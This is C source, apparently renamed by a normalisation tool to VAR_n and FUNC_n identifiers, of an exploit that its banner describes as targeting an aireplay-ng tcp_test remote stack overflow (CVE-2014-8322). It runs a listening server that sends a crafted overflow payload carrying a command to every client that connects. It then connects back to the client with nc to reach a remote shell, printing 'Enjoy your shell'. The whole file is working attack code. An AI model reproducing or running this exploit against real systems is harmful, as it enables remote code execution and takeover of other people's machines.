
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


typedef int val ;
struct TYPE_2__ {scalar_t__ s_addr; } ;
struct sockaddr_in {TYPE_1__ sin_addr; int sin_family; int sin_port; } ;
struct sockaddr {int dummy; } ;
struct net_hdr {int dummy; } ;
typedef int socklen_t ;
typedef int server ;
typedef int rh ;
typedef int exec ;


 int VAR_0 ;
 char* VAR_1 ;
 int VAR_2 ;
 int VAR_3 ;
 int VAR_4 ;
 int VAR_5 ;
 int VAR_6 ;
 int FUNC_0 (int,struct sockaddr*,int*) ;
 int FUNC_1 (char*) ;
 int FUNC_2 (int,struct sockaddr*,int) ;
 int FUNC_3 (int) ;
 unsigned char* FUNC_4 (char*,size_t) ;
 int FUNC_5 (int ,char*,char*,char*) ;
 int FUNC_6 (unsigned char*) ;
 int FUNC_7 (int) ;
 char* FUNC_8 (TYPE_1__) ;
 int FUNC_9 (int,int) ;
 int FUNC_10 (char*,char,int) ;
 int FUNC_11 (char*) ;
 int FUNC_12 (char*,...) ;
 int FUNC_13 (int,struct net_hdr*,int,int ) ;
 int FUNC_14 (int,unsigned char*,size_t,int ) ;
 int FUNC_15 (int,int ,int ,int*,int) ;
 int FUNC_16 (int) ;
 int FUNC_17 (char*,int,char*,char*,int) ;
 int FUNC_18 (int ,int ,int ) ;
 int VAR_7 ;
 int FUNC_19 (char*) ;
 int FUNC_20 (char*) ;

int FUNC_21(int VAR_8, char *VAR_9[])
{
    struct net_hdr VAR_10;
    struct sockaddr_in VAR_11, VAR_12;
    unsigned char *VAR_13;
    socklen_t VAR_14;
    size_t VAR_15;
    char *VAR_16, VAR_17[1024];
    int VAR_18, VAR_19, VAR_20 = 1;

    FUNC_12("[+]Exploit for aireplay-ng tcp_test remote stack overflow\n");
    FUNC_12("[+]Written by Nick Sampanis CVE-2014-8322\n");
    if (VAR_8 == 1) {
        FUNC_5(VAR_7,"[-]Usage: %s port command\n"
                "[-][Default %s]\n", VAR_9[0], VAR_1);
        return -1;
    }
    if ((VAR_18 = FUNC_18(VAR_0, VAR_4, VAR_2)) == -1) {
        FUNC_11("[-]Socket()");
        return -1;
    }
    FUNC_10((char *)&VAR_11, '\0', sizeof(VAR_11));
    VAR_14 = sizeof(VAR_11);
    VAR_11.sin_addr.s_addr = 0;
    VAR_11.sin_port = FUNC_7(FUNC_1(VAR_9[1]));
    VAR_11.sin_family = VAR_0;
    if (VAR_9[2])
        VAR_16 = VAR_9[2];
    else
        VAR_16 = VAR_1;

    FUNC_15(VAR_18, VAR_5,VAR_6, &VAR_20, sizeof(VAR_20));
    if (FUNC_2(VAR_18, (struct sockaddr *)&VAR_11, sizeof(VAR_11)) == -1) {
        FUNC_11("bind()");
        return -1;
    }
    if (FUNC_9(VAR_18, 5) == -1) {
        FUNC_11("listen()");
        return -1;
    }
    FUNC_12("[+]Server is waiting for connections on port %d\n", FUNC_1(VAR_9[1]));

    if (!(VAR_15 = (FUNC_19(VAR_16)+8)*5/4*8+VAR_3+sizeof(VAR_10)))
        return -1;
    VAR_13 = FUNC_4(VAR_16, VAR_15);
    while (1) {
        if ((VAR_19 = FUNC_0(VAR_18, (struct sockaddr *)&VAR_12, &VAR_14)) == -1) {
            FUNC_11("[-]Accept");
            return -1;
        }
        FUNC_12("[+]Client %s has been connected\n", FUNC_8(VAR_12.sin_addr));
        if (FUNC_14(VAR_19, VAR_13, VAR_15, 0) == -1) {
            FUNC_11("[-]Send");
            return -1;
        }
        if (FUNC_13(VAR_19, &VAR_10, sizeof(VAR_10), 0) == -1) {
            FUNC_11("[-]Recv");
            return -1;
        }
        FUNC_3(VAR_19);
        FUNC_16(1);
        if (!VAR_9[2]) {
            FUNC_12("[+]Enjoy your shell\n\n");
            FUNC_17(VAR_17, sizeof(VAR_17), "nc %s %d",
                    FUNC_8(VAR_12.sin_addr), FUNC_1(VAR_9[1]));
            FUNC_20(VAR_17);
        }

    }
    FUNC_3(VAR_18);
    FUNC_6(VAR_13);

    return 0;
}
